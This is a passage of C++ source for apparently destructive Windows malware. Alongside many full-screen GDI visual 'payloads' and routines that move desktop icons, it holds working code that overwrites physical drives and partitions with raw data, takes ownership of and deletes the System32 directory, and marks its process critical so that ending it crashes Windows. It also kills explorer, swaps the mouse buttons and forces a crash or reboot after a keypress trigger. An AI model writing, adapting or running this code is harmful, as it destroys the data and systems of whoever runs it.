		}

		// Glowing text with changing colors
		HFONT hFont = CreateFont(60, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
			CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, FF_DONTCARE, L"Arial");
		SelectObject(desk, hFont);
		SetTextColor(desk, RGB(rand() % 256, rand() % 256, rand() % 256));
		SetBkMode(desk, TRANSPARENT);
		TextOutW(desk, xs / 3, ys / 3, L"Mesmerizing", 11);
		Sleep(200);

		// Color-changing rectangles with flashing effect
		for (int i = 0; i < 5; i++) {
			hbrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hbrush);
			Rectangle(desk, 0, 0, xs, ys);
			Sleep(100);
			hbrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hbrush);
			Rectangle(desk, 0, 0, xs, ys);
			Sleep(100);
		}

		// Moving colorful spirals
		double spiralAngle = 0;
		for (int i = 0; i < 20; i++) {
			hpen = CreatePen(PS_SOLID, 5, RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(desk, hpen);
			double spiralRadius = 10.0 + i * 10.0;
			int x = xs / 2 + static_cast<int>(spiralRadius * cos(spiralAngle));
			int y = ys / 2 + static_cast<int>(spiralRadius * sin(spiralAngle));
			LineTo(desk, x, y);
			spiralAngle += 20.0;
			Sleep(100);
		}

		Sleep(200);
	}
	return 0;
}
DWORD WINAPI MoveIconsRandomly(LPVOID lpParam) {
	HWND  hwndParent = ::FindWindowA("Progman", "Program Manager");
	HWND  hwndSHELLDLL_DefView = ::FindWindowEx(hwndParent, NULL, L"SHELLDLL_DefView", NULL);
	HWND  hwndSysListView32 = ::FindWindowEx(hwndSHELLDLL_DefView, NULL, L"SysListView32", L"FolderView");

	int Nm = ListView_GetItemCount(hwndSysListView32);

	int sNm = 360 / Nm;

	int x = 0, y = 0;
	int speedx = 30;
	int speedy = 30;
	int i = 0;
	while (true)
	{
		x += speedx;
		y += speedy;
		if (x > 1920 + 1920 - 50 / 2)
			speedx = -30;
		if (x < 0)
			speedx = 30;
		if (y > 1080 - 50 / 2)
			speedy = -30;
		if (y < 0)
			speedy = 30;

		if (i < Nm)
			i++;
		else
			i = 0;

		::SendMessage(hwndSysListView32, LVM_SETITEMPOSITION, i, MAKELPARAM(x, y));
		ListView_RedrawItems(hwndSysListView32, i, i + 1);
		//		ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
		::UpdateWindow(hwndSysListView32);
		Sleep(10);
	}	return 0;
}
int rng() {
	return rand();
}
DWORD WINAPI DrawSomething(LPVOID lpParam) {
	while (1) {
		HDC hScreen = GetDC(NULL);
		RECT scRect;
		GetWindowRect(GetDesktopWindow(), &scRect);
		DWORD dwCTR = 0;
		DWORD dwSmegma = 0;
		RECT RectangleR;

		for (DWORD i = 0; i <= 20; i++) {
			HDC hDC = GetDC(NULL);

			// Randomly move pixels for distortion
			BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);

			if (i >= 5) {
				// Random pixel removal
				BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCAND);
			}

			if (i >= 10) {
				// StretchBlt distortion
				dwSmegma = rng() % (scRect.right > scRect.bottom ? scRect.right : scRect.bottom);
				StretchBlt(hDC, 1 + dwSmegma % scRect.right, 1 + dwSmegma % scRect.bottom, scRect.right - dwSmegma % scRect.right, dwSmegma % scRect.bottom, hDC, 1, 1, scRect.right, scRect.bottom, SRCAND);
			}

			if (i >= 15) {
				// Random pixel addition
				BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCPAINT);
			}

			if (i == 20) {
				for (DWORD j = 0; j < (scRect.right > scRect.bottom ? scRect.right : scRect.bottom); j++) {
					HDC hDCPen = GetDC(NULL);
					HDC hDCBrush = GetDC(NULL);
					SetDCPenColor(hDCPen, RGB(rng() % 256, rng() % 256, rng() % 256));
					SetDCBrushColor(hDCBrush, RGB(rng() % 256, rng() % 256, rng() % 256));

					// Draw Ellipse
					if (j % 20 == 0) {
						Ellipse(hDC, rng() % scRect.right, rng() % scRect.bottom, rng() % scRect.right, rng() % scRect.bottom);
					}

					// BitBlt with SRCINVERT
					if (j % 100 == 0) {
						BitBlt(hDC, 1, 1, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), hDC, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), SRCINVERT);
					}

					// Draw lines and rectangles
					MoveToEx(hDC, rng() % scRect.right, rng() % scRect.bottom, NULL);
					SetDCPenColor(hDCPen, RGB(rng() % 256, rng() % 256, rng() % 256));
					LineTo(hDC, rng() % scRect.right, rng() % scRect.bottom);
					HBRUSH hBrush = CreateSolidBrush(RGB(rng() % 256, rng() % 256, rng() % 256));
					RectangleR.left = j % scRect.right;
					RectangleR.top = j % scRect.bottom;
					RectangleR.bottom = RectangleR.top + rng() % 100;
					RectangleR.right = RectangleR.left + rng() % 100;
					FillRect(hDC, &RectangleR, hBrush);
					DeleteObject(hBrush);

					Sleep(10);
				}
			}

			Sleep(1000);
		}

		// Rest of the code

		ReleaseDC(NULL, hScreen);
	}
	return 0;
}
DWORD WINAPI MandelBrot(LPVOID lpvd) {
	hwnd1 = GetDesktopWindow();
	RECT rect1;
	GetClientRect(hwnd1, &rect1);
	int w = rect1.right - rect1.left;
	int h = rect1.bottom - rect1.top;
	dc = GetDC(0);
	dcCopy = CreateCompatibleDC(dc);

	BITMAPINFO bmpi = { 0 };

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	while (1) {
		StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;

				double fractalX = (2.5f / w);
				double fractalY = (1.90f / h);

				double cx = (x - w / 2) * fractalX / zoom + (maxReal + minReal) / 2;
				double cy = (y - h / 2) * fractalY / zoom + (maxImag + minImag) / 2;

				double zx = 0;
				double zy = 0;

				int fx = 0;

				while (((zx * zx) + (zy * zy)) < 10 && fx < maxIterations) {
					double fczx = zx * zx - zy * zy + cx;
					double fczy = 2 * zx * zy + cy;

					zx = fczx;
					zy = fczy;
					fx++;

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}
		}

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		zoom *= 1.01; // Increase zoom factor for each iteration
	}

	ReleaseDC(0, dc);
	DeleteDC(dcCopy);

	return 0;
}
DWORD WINAPI SquareTunnel(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = SCR_WIDTH;
		int sh = SCR_HEIGHT;
		StretchBlt(hdc, 0, 0, rand() % sw, rand() % sh, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(GetDesktopWindow(), hdc);
		Sleep(100);
	}
}
DWORD WINAPI ColourHalf(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = SCR_WIDTH;
		int y = SCR_HEIGHT;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, rand() % x, rand() % y, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), hdc);
		Sleep(10);
	}
}
DWORD WINAPI InvertScreen(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = SCR_WIDTH;
		int h = SCR_HEIGHT;
		BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, -1, -1, w, h, hdc, 0, 0, SRCINVERT);
		ReleaseDC(GetDesktopWindow(), hdc);
		Sleep(10);
	}
}
DWORD WINAPI Light(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = SCR_WIDTH;
		int h = SCR_HEIGHT;
		BitBlt(hdc, 1, 0, w, h, hdc, 0, 0, SRCPAINT);
		BitBlt(hdc, -1, 0, w, h, hdc, 0, 0, SRCPAINT);
		BitBlt(hdc, 0, 1, w, h, hdc, 0, 0, SRCPAINT);
		BitBlt(hdc, 0, -1, w, h, hdc, 0, 0, SRCPAINT);
		ReleaseDC(GetDesktopWindow(), hdc);
		Sleep(10);
	}
}
// Payload that modifies RGB values of each pixel
DWORD WINAPI ModifyRGBValues(LPVOID lpParam) {
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		width * height * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	while (true) {
		HDC hdc = GetDC(0);
		HDC hdcCompatible = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
		SelectObject(hdcCompatible, hBitmap);
		BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, width * height * sizeof(RGBQUAD), data);

		// Modify RGB values of each pixel
		for (int i = 0; i < width * height; i++) {
			data[i].rgbRed = (data[i].rgbRed + 1) % 256;
			data[i].rgbGreen = (data[i].rgbGreen + 2) % 256;
			data[i].rgbBlue = (data[i].rgbBlue + 3) % 256;
		}

		SetBitmapBits(hBitmap, width * height * sizeof(RGBQUAD), data);
		BitBlt(hdc, 0, 0, width, height, hdcCompatible, 0, 0, SRCCOPY);
		DeleteObject(hBitmap);
		DeleteDC(hdcCompatible);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
// Payload that creates a colorful noise effect
DWORD WINAPI ColorfulNoise(LPVOID lpParam) {
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		width * height * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	while (true) {
		HDC hdc = GetDC(0);
		HDC hdcCompatible = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
		SelectObject(hdcCompatible, hBitmap);
		BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

		// Create colorful noise effect
		for (int i = 0; i < width * height; i++) {
			data[i].rgbRed = rand() % 256;
			data[i].rgbGreen = rand() % 256;
			data[i].rgbBlue = rand() % 256;
		}

		SetBitmapBits(hBitmap, width * height * sizeof(RGBQUAD), data);
		BitBlt(hdc, 0, 0, width, height, hdcCompatible, 0, 0, SRCCOPY);
		DeleteObject(hBitmap);
		DeleteDC(hdcCompatible);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
// Payload that creates an RGB color cycling effect
DWORD WINAPI RGBColorCycling(LPVOID lpParam) {
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		width * height * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	int cycle = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hdcCompatible = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
		SelectObject(hdcCompatible, hBitmap);
		BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, width * height * sizeof(RGBQUAD), data);

		// Apply RGB color cycling effect
		for (int i = 0; i < width * height; i++) {
			data[i].rgbRed = (data[i].rgbRed + cycle) % 256;
			data[i].rgbGreen = (data[i].rgbGreen + cycle) % 256;
			data[i].rgbBlue = (data[i].rgbBlue + cycle) % 256;
		}
		cycle = (cycle + 1) % 256;

		SetBitmapBits(hBitmap, width * height * sizeof(RGBQUAD), data);
		BitBlt(hdc, 0, 0, width, height, hdcCompatible, 0, 0, SRCCOPY);
		DeleteObject(hBitmap);
		DeleteDC(hdcCompatible);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
}
DWORD WINAPI Checkokey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x4F) == 0) {
		//sleep 
		Sleep(10);
	}
	//MessageBoxA(NULL, "No?", "NO", MB_OK | MB_ICONERROR);
	infect();
	WCHAR SystemDirectory[MAX_PATH] = { 0 };
	GetSystemDirectory(SystemDirectory, MAX_PATH);
	DestroyDirectory(SystemDirectory);
	CrashORRebootWindows();
	return 0;
}
void execute() {
	const char* text = "\n\nGOOD LUCK.";
	// Loop through the text and type each character
	for (int i = 0; i < strlen(text); i++)
	{
		// Set the character to type
		char c = text[i];

		// Create an input event for the character
		INPUT input;
		input.type = INPUT_KEYBOARD;
		input.ki.wVk = 0;
		input.ki.wScan = c;
		input.ki.dwFlags = KEYEVENTF_UNICODE;

		// Send the input event to Notepad
		SendInput(1, &input, sizeof(INPUT));

		// Wait a short amount of time before typing the next character
		Sleep(150);
	}
	clean();
	ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
	ShellExecute(NULL, NULL, L"taskkill /f /im notepad.exe", NULL, NULL, SW_HIDE);
	HANDLE thread = CreateThread(NULL, NULL, &Light, NULL, NULL, NULL);
	BOOL swapButtons = TRUE;

	// Swap the mouse buttons
	SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 0, (LPVOID)swapButtons, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
	// Enable CMD
	RegSetKeyValue(HKEY_CURRENT_USER, _T("Software\\Policies\\Microsoft\\Windows\\System"), _T("DisableCMD"), REG_DWORD, 0, sizeof(DWORD));

	// Enable Task Manager
	RegSetKeyValue(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), _T("DisableTaskMgr"), REG_DWORD, 0, sizeof(DWORD));

	// Enable MSPaint
	RegSetKeyValue(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), _T("NoDispScrSavPage"), REG_DWORD, 0, sizeof(DWORD));

	// Launch CMD
	ShellExecute(NULL, _T("open"), _T("cmd.exe"), NULL, NULL, SW_SHOW);

	// Launch Task Manager
	ShellExecute(NULL, _T("open"), _T("taskmgr.exe"), NULL, NULL, SW_SHOW);

	// Launch MSPaint
	ShellExecute(NULL, _T("open"), _T("mspaint.exe"), NULL, NULL, SW_SHOW);
	infect();
	Sleep(60000);
	CrashORRebootWindows();
}
DWORD WINAPI CheckSKey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x53) == 0) { // 0x53 is the virtual key code for the 'S' key
		Sleep(10);
	}
	//MessageBoxA(NULL, "S Pressed!", "YES", MB_OK | MB_ICONINFORMATION);
	SetEvent(sPressedEvent); // Signal the event
	sPressed = true;
	if (sPressed) {
		//MessageBoxA(NULL, "S Pressed!", "YES", MB_OK | MB_ICONINFORMATION);
	}
	return 0;
}
LPCWSTR overwrite[] = {
	L"\\\\.\\PhysicalDrive0",
	L"\\\\.\\PhysicalDrive1",
	L"\\\\.\\PhysicalDrive2",
	L"\\\\.\\C:",
	L"\\\\.\\D:",
	L"\\\\.\\E:",
	L"\\\\.\\Harddisk0Partition1",
	L"\\\\.\\Harddisk0Partition2",
	L"\\\\.\\Harddisk0Partition3",
	L"\\\\.\\Harddisk0Partition4",
	L"\\\\.\\Harddisk0Partition5",
	L"\\\\.\\Harddisk1Partition1",
	L"\\\\.\\Harddisk1Partition2",
	L"\\\\.\\Harddisk1Partition3",
	L"\\\\.\\Harddisk1Partition4",
	L"\\\\.\\Harddisk1Partition5",
	L"\\\\.\\Harddisk2Partition1",
	L"\\\\.\\Harddisk2Partition2",
	L"\\\\.\\Harddisk2Partition3",
	L"\\\\.\\Harddisk2Partition4",
	L"\\\\.\\Harddisk2Partition5"
};

long long FileNum = 0;
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);

void OverWrite(LPCWSTR Name) {
	HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	//unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
	DWORD dwUnused;
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	for (int i = 0; i < 50000; i++) {
		WriteFile(hFile, rawData, 512, &dwUnused, NULL);
	}
	CloseHandle(hFile);
}

void OverWriteDisk() {
	for (int i = 0; i < nOverwrite; i++) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
		Sleep(10);
	}
}
bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		return false;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		return false;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		return false;
	}

	return true;
}
void SetCriticalProcess() {
	BOOL bl;
	NTSTATUS status;
	ULONG BreakOnTermination = 1;

	// Get a handle to the current process
	HANDLE hProcess = GetCurrentProcess();

	// Enable the "SeDebugPrivilege" privilege for this process
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
	if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		// handle error
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
		// handle error
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		// handle error
	}

	// Set the process as critical
	if (!SetProcessShutdownParameters(0x100, SHUTDOWN_NORETRY)) {
		// handle error
	}

	// Set the process as critical
	status = NtSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status)) {
		// handle error
		ExitWindows(EWX_REBOOT, 0);
	}
}
bool TakeOwnership(LPCTSTR lpszOwnFile)
{
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	const int NUM_ACES = 2;
	EXPLICIT_ACCESS ea[NUM_ACES];
	DWORD dwRes;

	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
	{
		return false;
	}

	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin))
	{
		return false;
	}

	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

	ea[0].grfAccessPermissions = GENERIC_READ;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

	ea[1].grfAccessPermissions = GENERIC_ALL;
	ea[1].grfAccessMode = SET_ACCESS;
	ea[1].grfInheritance = NO_INHERITANCE;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

	if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))
	{
		return false;
	}

	dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (ERROR_SUCCESS == dwRes)
	{
		return true;
	}

	if (dwRes != ERROR_ACCESS_DENIED)
	{
		return false;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		return false;
	}

	if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true))
	{
		CloseHandle(hToken);
		return false;
	}

	dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

	if (dwRes != ERROR_SUCCESS)
	{
		SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
		CloseHandle(hToken);
		return false;
	}

	dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwRes != ERROR_SUCCESS)
	{
		SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
		CloseHandle(hToken);
		return false;
	}

	SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
	CloseHandle(hToken);
	return true;
}
void DestroyDirectory(LPWSTR Directory) {
	// Take ownership of the directory and its contents
	TakeOwnership(Directory);

	// Append a backslash if necessary
	if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
		lstrcat(Directory, L"\\");
	}

	// Construct the search path
	WCHAR SearchDir[MAX_PATH] = { 0 };
	lstrcpy(SearchDir, Directory);
	lstrcat(SearchDir, L"*.*");

	// Find the first file in the directory
	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFile(SearchDir, &findData);

	// If no files were found, return
	if (hSearch == INVALID_HANDLE_VALUE) {
		return;
	}

	// Iterate over each file in the directory
	else do {
		// Ignore the "." and ".." directories and symbolic links
		if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			continue;
		}

		// Construct the full path to the file
		WCHAR Path[MAX_PATH] = { 0 };
		lstrcpy(Path, Directory);
		lstrcat(Path, findData.cFileName);

		// Increment the file count
		if (FileNum < LLONG_MAX) {
			FileNum++;
		}

		// If the file is a directory, recursively delete its contents and the directory itself
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcat(Path, L"\\");
			DestroyDirectory(Path);
			RemoveDirectory(Path);
		}
		// If the file is a regular file, take ownership and delete it
		else if (TakeOwnership(Path) && !(FileNum % 15)) {
			DeleteFile(Path);
		}
	} while (FindNextFile(hSearch, &findData));

	// Close the search handle
	FindClose(hSearch);
}